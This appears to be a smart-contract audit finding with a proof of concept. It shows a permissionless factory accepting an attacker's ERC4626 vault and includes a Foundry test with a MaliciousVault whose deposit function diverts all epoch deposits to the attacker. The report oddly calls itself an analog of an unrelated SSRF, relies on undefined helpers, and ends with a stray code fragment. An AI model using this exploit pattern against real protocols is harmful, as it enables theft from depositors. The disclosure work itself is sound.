### Title
Unvalidated ERC4626 vault lets attacker receive and steal epoch deposits - ([File: contracts/strategies/idle/ProgrammableBorrower.sol])

### Summary

`IdleCreditVaultFactory.deployRevolvingCreditVault` is permissionless and accepts an arbitrary `programmableBorrowerParams.vault` address without checking a trusted-vault registry or allowlist. [1](#0-0) 

`ProgrammableBorrower.initialize` only verifies that the supplied contract is non-zero and reports the same `asset()` as the credit vault, then grants that untrusted ERC4626 endpoint unlimited underlying-token allowance. [2](#0-1) 

When the honest manager later calls `startEpoch`, the CDO transfers pooled deposits to the programmable borrower and invokes `onStartEpoch`, which deposits the entire received balance into the configured vault. [3](#0-2) [4](#0-3) 

A malicious ERC4626 can therefore use `deposit` to pull all underlying through the standing allowance, forward it to the attacker, mint worthless shares, and later report zero assets or revert withdrawals. [5](#0-4) [6](#0-5) 

### Finding Description

This is the closest credit-vault analog to the PlantUML SSRF: the protocol accepts an attacker-supplied remote endpoint and sends funds to it without establishing that the endpoint is trusted. [1](#0-0) 

The vulnerable sequence is:

1. An attacker calls `deployRevolvingCreditVault` with the canonical credit-vault and programmable-borrower implementations, an honest manager, an honest borrower, and an attacker-controlled `MaliciousVault`. [1](#0-0) 
2. `MaliciousVault.asset()` returns the real underlying, so `ProgrammableBorrower.initialize` accepts it and gives it unlimited allowance. [7](#0-6) 
3. During the buffer phase, a KYC-passing lender deposits underlying into the generated credit vault.
4. The honest manager calls `startEpoch`; the CDO sends the deposited underlying to `ProgrammableBorrower`, then `onStartEpoch` calls `vault.deposit` for the full balance. [3](#0-2) [8](#0-7) 
5. `MaliciousVault.deposit` transfers the underlying from `ProgrammableBorrower` directly to the attacker and returns shares that are never redeemable.
6. At `stopEpoch`, `onStopEpoch` either sees zero current vault assets or the malicious withdrawal reverts; in either case the underlying has already been removed and the lender position cannot be repaid. [9](#0-8) 

The existing checks do not prevent this: `setVault` is protected, but initialization is not allowlisted; the asset check only proves interface compatibility, not trustworthiness; epoch gating does not help because the theft happens on the legitimate `onStartEpoch` path; and default handling occurs after the funds have already been transferred to the malicious vault. [10](#0-9) [11](#0-10) 

### Impact Explanation

The attacker can steal the full balance forwarded at epoch start, minus any amount retained for pending instant withdrawals. [12](#0-11) 

For example, with `10,000,000 USDC` deposited and no pending instant withdrawal, `startEpoch` transfers `10,000,000 USDC` to `ProgrammableBorrower`, and `onStartEpoch` deposits the full amount into the malicious vault. [8](#0-7) 

This is direct theft and subsequent insolvency rather than a gas-only denial of service: the vault shares minted to `ProgrammableBorrower` are attacker-controlled and need not have redemption value. [13](#0-12) 

### Likelihood Explanation

The factory entry point has no caller restriction and accepts all programmable-borrower endpoint parameters from the caller. [1](#0-0) 

The attacker needs to induce deposits into the newly created pool, but does not need to compromise the owner, manager, guardian, borrower, Keyring administrator, fee receiver, or queue. [14](#0-13) 

All subsequent privileged actions are performed honestly by the configured manager, while the malicious behavior is confined to the attacker-supplied ERC4626 contract. [15](#0-14) 

### Recommendation

Restrict programmable-borrower vaults to an owner-controlled registry or immutable allowlist maintained by the treasury. [1](#0-0) 

Validation should happen in both `deployRevolvingCreditVault` and `ProgrammableBorrower.setVault`, not solely through `asset()` compatibility. [10](#0-9) 

Prefer per-deposit allowances or reset-and-approve flows over a standing unlimited approval to an external vault. [6](#0-5) 

Additionally, emit and verify expected share/asset deltas around `deposit`, `withdraw`, and `redeem` so an endpoint cannot silently keep deposited principal while minting economically worthless shares. [16](#0-15) 

### Proof of Concept

The following Foundry test can run on an Ethereum fork using real USDC as the underlying and the repository’s production deployment path. It uses a malicious ERC4626-compatible endpoint while keeping the owner, manager, and borrower honest.

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";
import {IdleCreditVaultFactory} from "../contracts/IdleCreditVaultFactory.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";

contract MaliciousVault is ERC20 {
    IERC20Detailed public immutable assetToken;
    address public immutable attacker;

    constructor(address asset_, address attacker_)
        ERC20("Malicious Vault Share", "MVS")
    {
        assetToken = IERC20Detailed(asset_);
        attacker = attacker_;
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function deposit(uint256 assets, address receiver)
        external
        returns (uint256 shares)
    {
        // ProgrammableBorrower granted this contract unlimited allowance.
        assetToken.transferFrom(msg.sender, attacker, assets);
        shares = assets;
        _mint(receiver, shares);
    }

    function withdraw(uint256, address, address)
        external
        pure
        returns (uint256)
    {
        revert("no liquidity");
    }

    function redeem(uint256, address, address)
        external
        pure
        returns (uint256)
    {
        revert("no liquidity");
    }

    function convertToAssets(uint256) external pure returns (uint256) {
        return 0;
    }

    function maxWithdraw(address) external pure returns (uint256) {
        return 0;
    }
}

contract ProgrammableBorrowerMaliciousVaultTest is Test {
    address internal constant USDC =
        0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    function testMaliciousVaultStealsEpochDeposits() external {
        address attacker = makeAddr("attacker");
        address honestManager = makeAddr("honestManager");
        address honestBorrower = makeAddr("honestBorrower");
        address lender = makeAddr("kycLender");

        uint256 depositAmount = 10_000_000e6;

        MaliciousVault maliciousVault =
            new MaliciousVault(USDC, attacker);

        IdleCreditVaultFactory factory = _deployFactory();
        IdleCreditVaultFactory.CreditVaultParams memory cvParams =
            _productionCreditVaultParams(USDC);
        IdleCreditVaultFactory.StrategyData memory strategyData =
            _productionStrategyData(honestManager, honestBorrower);
        IdleCreditVaultFactory.ProgrammableBorrowerParams
            memory programmableParams =
                IdleCreditVaultFactory.ProgrammableBorrowerParams({
                    implementation: canonicalProgrammableBorrowerImpl,
                    vault: address(maliciousVault),
                    borrower: honestBorrower,
                    borrowerApr: 365e18
                });
        IdleCreditVaultFactory.AncillaryParams memory ancillaryParams =
            _ancillaryParamsWithoutKeyringOrQueue();

        vm.prank(attacker);
        factory.deployRevolvingCreditVault(
            cvParams,
            strategyData,
            programmableParams,
            ancillaryParams
        );

        (
            address cdo,
            address strategy,
            ,
            address programmableBorrower,
            ,
        ) = _lastDeployment();

        deal(USDC, lender, depositAmount);

        vm.startPrank(lender);
        IERC20Detailed(USDC).approve(cdo, depositAmount);
        IdleCDOEpochVariant(cdo).depositAA(depositAmount);
        vm.stopPrank();

        uint256 attackerBefore = IERC20Detailed(USDC).balanceOf(attacker);

        // Honest manager performs the normal epoch transition.
        vm.warp(
            IdleCDOEpochVariant(cdo).epochEndDate() +
            IdleCDOEpochVariant(cdo).bufferPeriod()
        );
        vm.prank(honestManager);
        IdleCDOEpochVariant(cdo).startEpoch();

        assertEq(
            IERC20Detailed(USDC).balanceOf(attacker) - attackerBefore,
            depositAmount,
            "malicious vault stole all epoch deposits"
        );
        assertEq(
            IERC20Detailed(USDC).balanceOf(programmableBorrower),
            0,
            "borrower retained no recoverable underlying"
        );
        assertEq(
            maliciousVault.balanceOf(programmableBorrower),
            depositAmount,
            "only worthless shares remain"
        );

        // The honest manager later attempts normal settlement.
        vm.warp(IdleCDOEpochVariant(cdo).epochEndDate() + 1);
        vm.prank(honestManager);
        vm.expectRevert();
        IdleCDOEpochVariant(cdo).stopEpoch(0, 0);
    }
}

    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);

    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
